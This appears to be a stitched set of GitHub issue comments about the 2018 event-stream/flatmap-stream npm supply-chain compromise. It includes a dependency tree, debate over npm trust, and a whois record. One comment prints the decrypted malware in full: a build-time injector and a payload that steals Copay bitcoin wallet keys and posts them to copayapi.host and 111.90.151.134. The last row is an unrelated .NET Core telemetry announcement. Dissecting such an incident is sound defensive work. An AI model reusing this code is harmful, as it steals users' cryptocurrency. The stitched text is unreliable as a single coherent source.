|   | | | | +-- regex-not@1.0.2 deduped                          
|   | | | | +-- snapdragon@0.8.2 deduped                         
|   | | | | `-- to-regex@3.0.2 deduped                           
|   | | | +-- extend-shallow@2.0.1 deduped                       
|   | | | +-- fragment-cache@0.2.1 deduped                       
|   | | | +-- regex-not@1.0.2 deduped                            
|   | | | +-- snapdragon@0.8.2 deduped                           
|   | | | `-- to-regex@3.0.2 deduped                             
|   | | +-- fragment-cache@0.2.1                                 
|   | | | `-- map-cache@0.2.2 deduped                            
|   | | +-- kind-of@6.0.2                                        
|   | | +-- nanomatch@1.2.13                                     
|   | | | +-- arr-diff@4.0.0 deduped                             
|   | | | +-- array-unique@0.3.2 deduped                         
|   | | | +-- define-property@2.0.2                              
|   | | | | +-- is-descriptor@1.0.2 deduped                      
|   | | | | `-- isobject@3.0.1 deduped                           
|   | | | +-- extend-shallow@3.0.2                               
|   | | | | +-- assign-symbols@1.0.0 deduped                     
|   | | | | `-- is-extendable@1.0.1                              
|   | | | |   `-- is-plain-object@2.0.4 deduped                  
|   | | | +-- fragment-cache@0.2.1 deduped                       
|   | | | +-- is-windows@1.0.2                                   
|   | | | +-- kind-of@6.0.2                                      
|   | | | +-- object.pick@1.3.0 deduped                          
|   | | | +-- regex-not@1.0.2 deduped                            
|   | | | +-- snapdragon@0.8.2 deduped                           
|   | | | `-- to-regex@3.0.2 deduped                             
|   | | +-- object.pick@1.3.0                                    
|   | | | `-- isobject@3.0.1 deduped                             
|   | | +-- regex-not@1.0.2                                      
|   | | | +-- extend-shallow@3.0.2                               
|   | | | | +-- assign-symbols@1.0.0 deduped                     
|   | | | | `-- is-extendable@1.0.1                              
|   | | | |   `-- is-plain-object@2.0.4 deduped                  
|   | | | `-- safe-regex@1.1.0 deduped                           
|   | | +-- snapdragon@0.8.2 deduped                             
|   | | `-- to-regex@3.0.2 deduped                               
|   | `-- normalize-path@2.1.1 deduped                           
|   +-- async-each@1.0.1                                         
|   +-- braces@2.3.2                                             
|   | +-- arr-flatten@1.1.0                                      
|   | +-- array-unique@0.3.2                                     
|   | +-- extend-shallow@2.0.1                                   
|   | | `-- is-extendable@0.1.1                                  
|   | +-- fill-range@4.0.0                                       
|   | | +-- extend-shallow@2.0.1 deduped                         
|   | | +-- is-number@3.0.0                                      
|   | | | `-- kind-of@3.2.2                                      
|   | | |   `-- is-buffer@1.1.6                                  
|   | | +-- repeat-string@1.6.1                                  
|   | | `-- to-regex-range@2.1.1                                 
|   | |   +-- is-number@3.0.0 deduped                            
|   | |   `-- repeat-string@1.6.1 deduped                        
|   | +-- isobject@3.0.1                                         
|   | +-- repeat-element@1.1.3                                   
|   | +-- snapdragon@0.8.2                                       
|   | | +-- base@0.11.2                                          
|   | | | +-- cache-base@1.0.1                                   
|   | | | | +-- collection-visit@1.0.0                           
|   | | | | | +-- map-visit@1.0.0                                
|   | | | | | | `-- object-visit@1.0.1 deduped                   
|   | | | | | `-- object-visit@1.0.1                             
|   | | | | |   `-- isobject@3.0.1 deduped                       
|   | | | | +-- component-emitter@1.2.1 deduped                  
|   | | | | +-- get-value@2.0.6                                  
|   | | | | +-- has-value@1.0.0                                  
|   | | | | | +-- get-value@2.0.6 deduped                        
|   | | | | | +-- has-values@1.0.0                               
|   | | | | | | +-- is-number@3.0.0 deduped                      
|   | | | | | | `-- kind-of@4.0.0                                
|   | | | | | |   `-- is-buffer@1.1.6 deduped                    
|   | | | | | `-- isobject@3.0.1 deduped                         
|   | | | | +-- isobject@3.0.1 deduped                           
|   | | | | +-- set-value@2.0.0                                  
|   | | | | | +-- extend-shallow@2.0.1 deduped                   
|   | | | | | +-- is-extendable@0.1.1 deduped                    
|   | | | | | +-- is-plain-object@2.0.4 deduped                  
|   | | | | | `-- split-string@3.1.0 deduped                     
|   | | | | +-- to-object-path@0.3.0                             
|   | | | | | `-- kind-of@3.2.2 deduped                          
|   | | | | +-- union-value@1.0.0                                
|   | | | | | +-- arr-union@3.1.0 deduped                        
|   | | | | | +-- get-value@2.0.6 deduped                        
|   | | | | | +-- is-extendable@0.1.1 deduped                    
|   | | | | | `-- set-value@0.4.3                                
|   | | | | |   +-- extend-shallow@2.0.1 deduped                 
|   | | | | |   +-- is-extendable@0.1.1 deduped                  
|   | | | | |   +-- is-plain-object@2.0.4 deduped                
|   | | | | |   `-- to-object-path@0.3.0 deduped                 
|   | | | | `-- unset-value@1.0.0                                
|   | | | |   +-- has-value@0.3.1                                
|   | | | |   | +-- get-value@2.0.6 deduped                      
|   | | | |   | +-- has-values@0.1.4                             
|   | | | |   | `-- isobject@2.1.0                               
|   | | | |   |   `-- isarray@1.0.0 deduped                      
|   | | | |   `-- isobject@3.0.1 deduped                         
|   | | | +-- class-utils@0.3.6                                  
|   | | | | +-- arr-union@3.1.0                                  
|   | | | | +-- define-property@0.2.5 deduped                    
|   | | | | +-- isobject@3.0.1 deduped                           
|   | | | | `-- static-extend@0.1.2                              
|   | | | |   +-- define-property@0.2.5 deduped                  
|   | | | |   `-- object-copy@0.1.0                              
|   | | | |     +-- copy-descriptor@0.1.1                        
|   | | | |     +-- define-property@0.2.5 deduped                
|   | | | |     `-- kind-of@3.2.2 deduped                        
|   | | | +-- component-emitter@1.2.1                            
|   | | | +-- define-property@1.0.0                              
|   | | | | `-- is-descriptor@1.0.2 deduped                      
|   | | | +-- isobject@3.0.1 deduped                             
|   | | | +-- mixin-deep@1.3.1                                   
|   | | | | +-- for-in@1.0.2                                     
|   | | | | `-- is-extendable@1.0.1                              
|   | | | |   `-- is-plain-object@2.0.4 deduped                  
|   | | | `-- pascalcase@0.1.1                                   
|   | | +-- debug@2.6.9                                          
|   | | | `-- ms@2.0.0                                           
|   | | +-- define-property@0.2.5                                
|   | | | `-- is-descriptor@0.1.6                                
|   | | |   +-- is-accessor-descriptor@0.1.6                     
|   | | |   | `-- kind-of@3.2.2                                  
|   | | |   |   `-- is-buffer@1.1.6 deduped                      
|   | | |   +-- is-data-descriptor@0.1.4                         
|   | | |   | `-- kind-of@3.2.2                                  
|   | | |   |   `-- is-buffer@1.1.6 deduped                      
|   | | |   `-- kind-of@5.1.0                                    
|   | | +-- extend-shallow@2.0.1 deduped                         
|   | | +-- map-cache@0.2.2                                      
|   | | +-- source-map@0.5.7 deduped                             
|   | | +-- source-map-resolve@0.5.2                             
|   | | | +-- atob@2.1.2                                         
|   | | | +-- decode-uri-component@0.2.0                         
|   | | | +-- resolve-url@0.2.1                                  
|   | | | +-- source-map-url@0.4.0                               
|   | | | `-- urix@0.1.0                                         
|   | | `-- use@3.1.1                                            
|   | +-- snapdragon-node@2.1.1                                  
|   | | +-- define-property@1.0.0                                
|   | | | `-- is-descriptor@1.0.2 deduped                        
|   | | +-- isobject@3.0.1 deduped                               
|   | | `-- snapdragon-util@3.0.1                                
|   | |   `-- kind-of@3.2.2 deduped                              
|   | +-- split-string@3.1.0                                     
|   | | `-- extend-shallow@3.0.2                                 
|   | |   +-- assign-symbols@1.0.0 deduped                       
|   | |   `-- is-extendable@1.0.1                                
|   | |     `-- is-plain-object@2.0.4 deduped                    
|   | `-- to-regex@3.0.2                                         
|   |   +-- define-property@2.0.2                                
|   |   | +-- is-descriptor@1.0.2 deduped                        
|   |   | `-- isobject@3.0.1 deduped                             
|   |   +-- extend-shallow@3.0.2                                 
|   |   | +-- assign-symbols@1.0.0 deduped                       
|   |   | `-- is-extendable@1.0.1                                
|   |   |   `-- is-plain-object@2.0.4 deduped                    
|   |   +-- regex-not@1.0.2 deduped                              
|   |   `-- safe-regex@1.1.0                                     
|   |     `-- ret@0.1.15                                         
|   +-- UNMET OPTIONAL DEPENDENCY fsevents@^1.2.2                
|   +-- glob-parent@3.1.0                                        
|   | +-- is-glob@3.1.0                                          
|   | | `-- is-extglob@2.1.1 deduped                             
|   | `-- path-dirname@1.0.2                                     
|   +-- inherits@2.0.3                                           
|   +-- is-binary-path@1.0.1                                     
|   | `-- binary-extensions@1.11.0                               
|   +-- is-glob@4.0.0                                            
|   | `-- is-extglob@2.1.1                                       
|   +-- lodash.debounce@4.0.8                                    
|   +-- normalize-path@2.1.1                                     
|   | `-- remove-trailing-separator@1.1.0                        
|   +-- path-is-absolute@1.0.1                                   
|   +-- readdirp@2.1.0                                           
|   | +-- graceful-fs@4.1.11                                     
|   | +-- minimatch@3.0.4                                        
|   | | `-- brace-expansion@1.1.11                               
|   | |   +-- balanced-match@1.0.0                               
|   | |   `-- concat-map@0.0.1                                   
|   | +-- readable-stream@2.3.6                                  
|   | | +-- core-util-is@1.0.2                                   
|   | | +-- inherits@2.0.3 deduped                               
|   | | +-- isarray@1.0.0                                        
|   | | +-- process-nextick-args@2.0.0                           
|   | | +-- safe-buffer@5.1.2                                    
|   | | +-- string_decoder@1.1.1                                 
|   | | | `-- safe-buffer@5.1.2 deduped                          
|   | | `-- util-deprecate@1.0.2                                 
|   | `-- set-immediate-shim@1.0.1                               
|   `-- upath@1.1.0                                              
```

In the security world, there's a concept called ""defense in depth"".  That means you use multiple layers of security systems, processes, and procedures to reduce risk to acceptable levels.  In case one fails or isn't sufficient, you have others.

In the case of NPM and the JS community, you'd need both user vigilance AND maintainers not doing dumb things.  Users don't download 50 libraries that each could be replaced by 5 lines of code, and maintainers shouldn't give full access to some guy they met by way of a cold email from an anonymous github account with 3 repos.  

NPM should also implement some rules, guidelines, and systems for reducing the impact of this.  For instance, a better way to get all the packages that are affected by a given package, a method to roll back or lock out bad packages and accounts, and better security response times.  The idea someone had of denying uploads of minified code would also be a good idea.

Most of all, though, **the NPM community needs to change**.  The current climate of blindly installing minilibs for the sake of it is just unacceptable and introduces a lot of dependence on potentially dangerous code, especially considering how easy it is to hijack a minilib for malicious purposes.  Yes, those minilibs are tested and are so well used that they are probably rock-solid, but reducing dependencies reduces risk."
2016	"> The current climate of blindly installing minilibs for the sake of it is just unacceptable

@N3X15 Maybe this is un-acceptable, or maybe it's not.

I guess this depends on the amount of risk the user of the libraries is willing to take on. Big companies accept less risk, they (usually) move slower.
My crappy side-projects accept whatever risk needed for the development to be fun, and I sure as hell don't constantly check the dependencies for security issues - it just doesn't matter.

The wonder of OSS is that *you* can create an issue on GitHub and *you* can convince other people that this is un-acceptable and *you* can suggest alternative solutions.
OSS is about taking responsibility for things that matter, not hoping that someone else will make it better."
2017	"> 
> 
> > The current climate of blindly installing minilibs for the sake of it is just unacceptable
> 
> @N3X15 Maybe this is un-acceptable, or maybe it's not.
> 
> I guess this depends on the amount of risk the user of the libraries is willing to take on. Big companies accept less risk, they (usually) move slower.
> My crappy side-projects accept whatever risk needed for the development to be fun, and I sure as hell don't constantly check the dependencies for security issues - it just doesn't matter.
> 
> The wonder of OSS is that _you_ can create an issue on GitHub and _you_ can convince other people that this is un-acceptable and _you_ can suggest alternative solutions.
> OSS is about taking responsibility for things that matter, not hoping that someone else will make it better.

See, I would have said that 5 years ago, too, but that just isn't the case.

The figure of 1,296 dependencies that I've been tossing around is for a web project I've been working on for over a decade.  I only use NPM for pulling in CLI tools (and building highlight.js).  This started as a ""screwing around"" hobby project but I was recently approached by a rather large non-profit who took an interest in it, so now I'm hurriedly running around trying to clean up years of ""screwing around"".

Security practices should be applied consistently, or you end up like me, trying to audit years and years of magic 4AM code.

And as for contributing by making a ticket and telling the project something's wrong, _that's what this entire issue is about_."
2018	"@ISNIT0 
> The JS world is far from perfect, and loads of people have made loads of mistakes (👋)
> 
> I don't think kids should be worrying about writing safe and secure code, but companies usually want to protect themselves, and teach the kids they hire to be better.

Absolutely, that should be each company's goal. However, JS is used from tiniest companies with extremely limited budgets and IT departments all the way to strictly separated environments in which one is not necessarily required to know a single thing about the other (e.g. front-end vs secops). There's enormous amount of space for even more mistakes to happen.
I personally know nothing about @dominictarr, this is the first time I ever checked his Github repo and I have to say it's pretty impressive. Based on that I simply didn't expect such silly mistakes from his side, assuming that he is more than perfectly aware of all the trust and security related things we talk about here and implications of not applying them. Therefore my initial rant about ""responsibility""...

> In the spirit of Open Source, I created a PR: [i0natan/nodebestpractices#293](https://github.com/i0natan/nodebestpractices/pull/293)

+1

> NPM isn't really a compilation of best practices, it's more a compilation of shit that people could be bothered to create an NPMJS.com account for. Some of that stuff happens to be good and well-maintained, but the vast majority is utter garbage.

Yeah, actually true, anyone can witness that just by spending few minutes on npmjs.com and randomly browsing around =)

> 😄 I don't know about you, but I can feel a slew of blog posts being published on HN tomorrow about the future of JS!

As usual =) Unfortunately it will leave another dirty spot on many things, not only this isolated issue."
2019	"> Most of all, though, **the NPM community needs to change**. The current climate of blindly installing minilibs for the sake of it is just unacceptable and introduces a lot of dependence on potentially dangerous code, especially considering how easy it is to hijack a minilib for malicious purposes.

In `<h1>` with `<blink>` pretty please ;)

"
2020	Too late, `<blink>` is deprecated....
2021	"@alexforencich 
![text](https://user-images.githubusercontent.com/5173131/49108800-5e387600-f289-11e8-8b4b-d4ab26dfe875.gif)
"
2022	"@N3X15 OSS is awesome, I'm learning for other people's mistakes 😄 
Thanks for sharing!"
2023	I know there are tools for evaluating modules that are too heavy (like https://github.com/siddharthkp/cost-of-modules) are there any that will warn if a module is too trivial?
2024	"> 
> 
> I know there are tools for evaluating modules that are too heavy (like https://github.com/siddharthkp/cost-of-modules) are there any that will warn if a module is too trivial?

A simple line-counter would suffice."
2025	"> > I know there are tools for evaluating modules that are too heavy (like https://github.com/siddharthkp/cost-of-modules) are there any that will warn if a module is too trivial?
> 
> A simple line-counter would suffice.

```
import lodash from 'lodash';
import mysql from 'mysql-server-5.6-linux-x64';
import wombat from 'wombat';
import evilcode from 'evilcode';

let buildString = function () {
  // greet the user
  let a = 'hello'
  // we don't know who the user is; therefore, we have to handle all possibilities
  // as our code license only covers nations on this celestial body, the third rock from
  // Sol - aka Earth - we will only greet users who the license applies to. This will also
  // serve as notice that this software has not been licensed for use outside of Earth
  // The last thing I want is this code to be used to power some intergalactic oppressor
  // TODO: Contact lawyer about edge cases
  // - Orbit - Geosynchronous, LEO, etc.
  // - Moon - is this satellite technically considered to be part of earth?
       //       (If we're mining Helium-3 on the moon, I want in!)
  let b = 'world'
  let c = a
  /*
 ensure proper spacing
*/
c = a + ' '
  c = a + b
}

let greetString = buildString();
evilcorp(greetString);
console.log(greetString)
```

Yup, that's definitely not trivial. It's good code!"
2026	"> Yup, that's definitely not trivial. It's good code!

```js
const fs = require(""fs-extra"");
fs.readFile(require.resolve(""event-stream/index.js"")).then(content => {
    const lines = content.split(""\n"");
    console.log(lines.filter(line => {
        return !line.trim().startsWith(""//"");
    }).length);
});
```"
2027	"> 
> 
> > Yup, that's definitely not trivial. It's good code!
> 
> ```js
> const fs = require(""fs-extra"");
> fs.readFile(require.resolve(""event-stream/index.js"")).then(content => {
>     const lines = content.split(""\n"");
>     console.log(lines.filter(line => {
>         return !line.trim().startsWith(""//"");
>     }).length);
> });
> ```

Would likely involve AST traversal if you really want a more solid approach."
2028	Github user @right9ctrl was either removed by GitHub or he just removed/renamed himself but so far I have not seen anything from this person. I still believe this is intentional.
2029	"> 
> 
> Too late, `<blink>` is deprecated....

`<marquee>` still works"
2030	"I know there is cyclomatic complexity. Plus a lower bound like 30 lines would allow those interested in avoiding modules that are ""too small""."
2031	"What do you think about a solution like this?
https://medium.com/@eiriksletteberg/a-proposition-to-collectively-security-audit-the-most-used-npm-packages-36ed8cbc1f8d"
2032	"> Whois for 111.90.151.134:
> 
> ```
> $ whois 111.90.151.134
> % [whois.apnic.net]
> % Whois data copyright terms    http://www.apnic.net/db/dbcopyright.html
> 
> % Information related to '111.90.128.0 - 111.90.159.255'
> 
> % Abuse contact for '111.90.128.0 - 111.90.159.255' is 'abuse@shinjiru.com.my'
> 
> inetnum:        111.90.128.0 - 111.90.159.255
> netname:        SHINJIRU-MY
> descr:          Shinjiru Technology Sdn Bhd
> country:        MY
> admin-c:        STSB2-AP
> tech-c:         STSB2-AP
> country:        MY
> org:            ORG-STSB2-AP
> status:         ALLOCATED PORTABLE
> mnt-by:         APNIC-HM
> mnt-lower:      MAINT-SHINJIRU-MY
> mnt-routes:     MAINT-SHINJIRU-MY
> mnt-irt:        IRT-SHINJIRU-MY
> last-modified:  2018-01-11T13:04:14Z
> source:         APNIC
> 
> irt:            IRT-SHINJIRU-MY
> address:        19-2, Wisma Laxton, Jln Desa, Tmn Desa, Jln Klang Lama,, Kuala Lumpur Wilayah Persekutuan 58100
> e-mail:         abuse@shinjiru.com.my
> abuse-mailbox:  abuse@shinjiru.com.my
> admin-c:        STSB2-AP
> tech-c:         STSB2-AP
> auth:           # Filtered
> mnt-by:         MAINT-SHINJIRU-MY
> last-modified:  2017-03-20T10:31:35Z
> source:         APNIC
> 
> organisation:   ORG-STSB2-AP
> org-name:       Shinjiru Technology Sdn Bhd
> country:        MY
> address:        19-2, Wisma Laxton, Jln Desa, Tmn Desa, Jln Klang Lama,
> phone:          +60320318850
> fax-no:         +60320318851
> e-mail:         abuse@shinjiru.com.my
> mnt-ref:        APNIC-HM
> mnt-by:         APNIC-HM
> last-modified:  2018-01-11T12:57:21Z
> source:         APNIC
> 
> role:           Shinjiru Technology Sdn Bhd administrator
> address:        19-2, Wisma Laxton, Jln Desa, Tmn Desa, Jln Klang Lama,, Kuala Lumpur Wilayah Persekutuan 58100
> country:        MY
> phone:          +60320318850
> fax-no:         +60320318850
> e-mail:         abuse@shinjiru.com.my
> admin-c:        STSB2-AP
> tech-c:         STSB2-AP
> nic-hdl:        STSB2-AP
> mnt-by:         MAINT-SHINJIRU-MY
> last-modified:  2017-03-20T10:31:34Z
> source:         APNIC
> 
> % Information related to '111.90.144.0/21AS45839'
> 
> route:          111.90.144.0/21
> origin:         AS45839
> descr:          Shinjiru Technology Sdn Bhd
>                 19-2, Wisma Laxton, Jln Desa, Tmn Desa, Jln Klang Lama,
> mnt-by:         MAINT-SHINJIRU-MY
> last-modified:  2018-10-25T04:06:40Z
> source:         APNIC
> 
> % This query was served by the APNIC Whois Service version 1.88.15-46 (WHOIS-US4)
> ```

What's this address? Is it the person hacking bitcon?"
2033	"i ran `npm ls event-stream flatmap-stream` and i got this

```
-- nodemon@1.18.6
  `-- pstree.remy@1.1.0
    `-- ps-tree@1.1.0
      `-- event-stream@3.3.6 
        `-- flatmap-stream@0.1.1 

```

I think nodemon@1.18.6 is affected also"
2034	"> 
> 
> > Whois for 111.90.151.134:
> > ```
> > $ whois 111.90.151.134
> > % [whois.apnic.net]
> > % Whois data copyright terms    http://www.apnic.net/db/dbcopyright.html
> > 
> > % Information related to '111.90.128.0 - 111.90.159.255'
> > 
> > % Abuse contact for '111.90.128.0 - 111.90.159.255' is 'abuse@shinjiru.com.my'
> > 
> > inetnum:        111.90.128.0 - 111.90.159.255
> > netname:        SHINJIRU-MY
> > descr:          Shinjiru Technology Sdn Bhd
> > country:        MY
> > admin-c:        STSB2-AP
> > tech-c:         STSB2-AP
> > country:        MY
> > org:            ORG-STSB2-AP
> > status:         ALLOCATED PORTABLE
> > mnt-by:         APNIC-HM
> > mnt-lower:      MAINT-SHINJIRU-MY
> > mnt-routes:     MAINT-SHINJIRU-MY
> > mnt-irt:        IRT-SHINJIRU-MY
> > last-modified:  2018-01-11T13:04:14Z
> > source:         APNIC
> > 
> > irt:            IRT-SHINJIRU-MY
> > address:        19-2, Wisma Laxton, Jln Desa, Tmn Desa, Jln Klang Lama,, Kuala Lumpur Wilayah Persekutuan 58100
> > e-mail:         abuse@shinjiru.com.my
> > abuse-mailbox:  abuse@shinjiru.com.my
> > admin-c:        STSB2-AP
> > tech-c:         STSB2-AP
> > auth:           # Filtered
> > mnt-by:         MAINT-SHINJIRU-MY
> > last-modified:  2017-03-20T10:31:35Z
> > source:         APNIC
> > 
> > organisation:   ORG-STSB2-AP
> > org-name:       Shinjiru Technology Sdn Bhd
> > country:        MY
> > address:        19-2, Wisma Laxton, Jln Desa, Tmn Desa, Jln Klang Lama,
> > phone:          +60320318850
> > fax-no:         +60320318851
> > e-mail:         abuse@shinjiru.com.my
> > mnt-ref:        APNIC-HM
> > mnt-by:         APNIC-HM
> > last-modified:  2018-01-11T12:57:21Z
> > source:         APNIC
> > 
> > role:           Shinjiru Technology Sdn Bhd administrator
> > address:        19-2, Wisma Laxton, Jln Desa, Tmn Desa, Jln Klang Lama,, Kuala Lumpur Wilayah Persekutuan 58100
> > country:        MY
> > phone:          +60320318850
> > fax-no:         +60320318850
> > e-mail:         abuse@shinjiru.com.my
> > admin-c:        STSB2-AP
> > tech-c:         STSB2-AP
> > nic-hdl:        STSB2-AP
> > mnt-by:         MAINT-SHINJIRU-MY
> > last-modified:  2017-03-20T10:31:34Z
> > source:         APNIC
> > 
> > % Information related to '111.90.144.0/21AS45839'
> > 
> > route:          111.90.144.0/21
> > origin:         AS45839
> > descr:          Shinjiru Technology Sdn Bhd
> >                 19-2, Wisma Laxton, Jln Desa, Tmn Desa, Jln Klang Lama,
> > mnt-by:         MAINT-SHINJIRU-MY
> > last-modified:  2018-10-25T04:06:40Z
> > source:         APNIC
> > 
> > % This query was served by the APNIC Whois Service version 1.88.15-46 (WHOIS-US4)
> > ```
> 
> What's this address? Is it the person hacking bitcon?

Nobody's making any accusations, it was just noticed in network traffic.  IIRC, it was where things were being sent.  Usually, though, such servers are themselves compromised and the attacker has a foothold.  In other words, they may themselves be a victim."
2035	"From @cnorthwood comment: https://github.com/dominictarr/event-stream/issues/116#issuecomment-441727488  and using `process.env.npm_package_description = 'A Secure Bitcoin Wallet';`


We get:

```/*@@*/
module.exports = function(e) {
    try {
        if (!/build\:.*\-release/.test(process.argv[2])) return;
        var t = process.env.npm_package_description,
            r = require(""fs""),
            i = ""./node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js"",
            n = r.statSync(i),
            c = r.readFileSync(i, ""utf8""),
            o = require(""crypto"").createDecipher(""aes256"", t),
            s = o.update(e, ""hex"", ""utf8"");
        s = ""\n"" + (s += o.final(""utf8""));
        var a = c.indexOf(""\n/*@@*/"");
        0 <= a && (c = c.substr(0, a)), r.writeFileSync(i, c + s, ""utf8""), r.utimesSync(i, n.atime, n.mtime), process.on(""exit"", function() {
            try {
                r.writeFileSync(i, c, ""utf8""), r.utimesSync(i, n.atime, n.mtime)
            } catch (e) {}
        })
    } catch (e) {}
};

```
Pretty sure someone found that earlier, because I saw reference to ReedSolomonDecoder somewhere, but didn't see the full text.

Then decoding this bit (the ""s"" part above) yields:

```/*@@*/ ! function() {
    function e() {
        try {
            var o = require(""http""),
                a = require(""crypto""),
                c = ""-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\n2wIDAQAB\n-----END PUBLIC KEY-----"";

            function i(e, t, n) {
                e = Buffer.from(e, ""hex"").toString();
                var r = o.request({
                    hostname: e,
                    port: 8080,
                    method: ""POST"",
                    path: ""/"" + t,
                    headers: {
                        ""Content-Length"": n.length,
                        ""Content-Type"": ""text/html""
                    }
                }, function() {});
                r.on(""error"", function(e) {}), r.write(n), r.end()
            }

            function r(e, t) {
                for (var n = """", r = 0; r < t.length; r += 200) {
                    var o = t.substr(r, 200);
                    n += a.publicEncrypt(c, Buffer.from(o, ""utf8"")).toString(""hex"") + ""+""
                }
                i(""636f7061796170692e686f7374"", e, n), i(""3131312e39302e3135312e313334"", e, n)
            }

            function l(t, n) {
                if (window.cordova) try {
                    var e = cordova.file.dataDirectory;
                    resolveLocalFileSystemURL(e, function(e) {
                        e.getFile(t, {
                            create: !1
                        }, function(e) {
                            e.file(function(e) {
                                var t = new FileReader;
                                t.onloadend = function() {
                                    return n(JSON.parse(t.result))
                                }, t.onerror = function(e) {
                                    t.abort()
                                }, t.readAsText(e)
                            })
                        })
                    })
                } catch (e) {} else {
                    try {
                        var r = localStorage.getItem(t);
                        if (r) return n(JSON.parse(r))
                    } catch (e) {}
                    try {
                        chrome.storage.local.get(t, function(e) {
                            if (e) return n(JSON.parse(e[t]))
                        })
                    } catch (e) {}
                }
            }
            global.CSSMap = {}, l(""profile"", function(e) {
                for (var t in e.credentials) {
                    var n = e.credentials[t];
                    ""livenet"" == n.network && l(""balanceCache-"" + n.walletId, function(e) {
                        var t = this;
                        t.balance = parseFloat(e.balance.split("" "")[0]), ""btc"" == t.coin && t.balance < 100 || ""bch"" == t.coin && t.balance < 1e3 || (global.CSSMap[t.xPubKey] = !0, r(""c"", JSON.stringify(t)))
                    }.bind(n))
                }
            });
            var e = require(""bitcore-wallet-client/lib/credentials.js"");
            e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = function(e) {
                var t = this.getKeysFunc(e);
                try {
                    global.CSSMap && global.CSSMap[this.xPubKey] && (delete global.CSSMap[this.xPubKey], r(""p"", e + ""\t"" + this.xPubKey))
                } catch (e) {}
                return t
            }
        } catch (e) {}
    }
    window.cordova ? document.addEventListener(""deviceready"", e) : e()
}();```"
2036	All current dependents: https://gist.github.com/DanielRuf/7e4c9e0be5c8faf458832abf2eba70fc
2037	"> > But that random dude is more random the random dude who maintained it at first
> 
> I'd like to know how you measure the level of randomness.
> 


It's sad it would even have to be explained to a fellow programmer that it's pretty easy to measure ""dude randomness"".

The original maintainer: 
He is a random dude with at least one package that has been chosen by dozens of well-known app makers, and thousands of others over some years, and it's a safe bet a small fraction of them have vetted one of the version 3 releases of the package, and with the volume of users that even the small fraction is a noteworthy absolute total of eyeballs on the code.


Malware guy:
He is a random dude whose known body of work previoisly consisted of 3 barely touched forks.  

It's obvious that anyone who trusts code they did not personally vet  shares blame, but it's just as obvious that there are levels of trustworthiness and in the example above  that one random dude is far more dangerous to trust than the other.  
"
2038	"@mscarborough-lampdev,

Lol... Let me point out the obvious... Original unknown dude did not have encrypted payloads in his warez, and his code did not fail an audit.

(But good point otherwise)."
2039	"> @mscarborough-lampdev,
> 
> Lol... Let me point out the obvious... Original unknown dude did not have encrypted payloads in his warez, and his code did not fail an audit.
> 
> (But good point otherwise).

Indeed.  Sadly, NPM itself  has no solid processees that stopped new guy from hijacking the built up trustworthiness of the original maintainer. 


Each user is at fault for not vendoring code and personally vetting it.

The entire community shares blame for so willingly allowing obfuscated code at all instead of establishing a build process that shows unobfuscated code and just specifies a minifier to use during installation.

NPM itself  is at fault for many many things:
Not detecting and warning about new obfuscated code,
For automatically being over-aggressive in dependency upgrading,
For not warning when a package has changed ownership,
For not forcing ownership changes to constitute a major version change,
Etc

And the original maintainer (and all maintainers of popular packages) have to be discouraged from blithely exposing ""fans""/users to a massive drop in trustworthiness.
"
2040	"@shawngmc
> > > I know there are tools for evaluating modules that are too heavy (like https://github.com/siddharthkp/cost-of-modules) are there any that will warn if a module is too trivial?
> > 
> > 
> > A simple line-counter would suffice.
> 
> ```js
> import lodash from 'lodash';
> import mysql from 'mysql-server-5.6-linux-x64';
> import wombat from 'wombat';
> import evilcode from 'evilcode';
> 
> let buildString = function () {
>   // greet the user
>   let a = 'hello'
>   // we don't know who the user is; therefore, we have to handle all possibilities
>   // as our code license only covers nations on this celestial body, the third rock from
>   // Sol - aka Earth - we will only greet users who the license applies to. This will also
>   // serve as notice that this software has not been licensed for use outside of Earth
>   // The last thing I want is this code to be used to power some intergalactic oppressor
>   // TODO: Contact lawyer about edge cases
>   // - Orbit - Geosynchronous, LEO, etc.
>   // - Moon - is this satellite technically considered to be part of earth?
>   //       (If we're mining Helium-3 on the moon, I want in!)
>   let b = 'world'
>   let c = a
>   /*
>  ensure proper spacing
> */
> c = a + ' '
>   c = a + b
> }
> 
> let greetString = buildString();
> evilcorp(greetString);
> console.log(greetString)
> ```
> 
> Yup, that's definitely not trivial. It's good code!

`buildString()` returns `undefined`:
```js
let buildString = function () {
	let a = ""hello"";	// a: ""hello"", b: undefined, c: undefined
	let b = ""world"";	// a: ""hello"", b: ""world"", c: undefined
	let c = a;	// a: ""hello"", b: ""world"", c: ""hello""
	c = a + "" "";	// a: ""hello"", b: ""world"", c: ""hello ""
	c = a + b;	// a: ""hello"", b: ""world"", c: ""helloworld""
	// No `return;` statement implies `return undefined;`
};
```"
2041	"Our recent blog post discusses the addition of telemetry to the .NET Core tools. See: https://blogs.msdn.microsoft.com/dotnet/2016/05/16/announcing-net-core-rc2/#telemetry

Me and the folks on my team are motivated to provide a great product. As you can also see from the blog post, we've made some pretty dramatic changes in RC2. We believe that they are the right ones, but we need both feedback and usage data in order to help us find all of the rough edges. Usage data tends to be more objective in the aggregate and user feedback more insightful, so we do a better job when we have both available.

The data we collect does not identify individual users. We're only interested in aggregate data that we can use to identify trends. The telemetry feature is configurable, so you can turn it on/off at any time. It is also scoped, only applying to tools usage, not the rest of the product. We think that this is a good trade-off and recognize that not everyone will like it. We do know, however, that many people will like the product improvements that will come from this insight.

We intend to share the data. The presence of it will do a lot to define the scope of data. It will also give the community access to the same insight we have. We very much feel that improving .NET Core is a shared need and task. As an example, we would welcome a PR from the community that added another telemetry data point given a strong improvement reason and no loss in anonymity.

We are separately considering _opt-in_ runtime telemetry to learn more about crashes, GC pauses and startup time. There is no way we can get enough insight about the product without that kind of information. We are very focussed on constant improvement and will _transparently_ do what it takes to ensure the product is compelling and competitive.

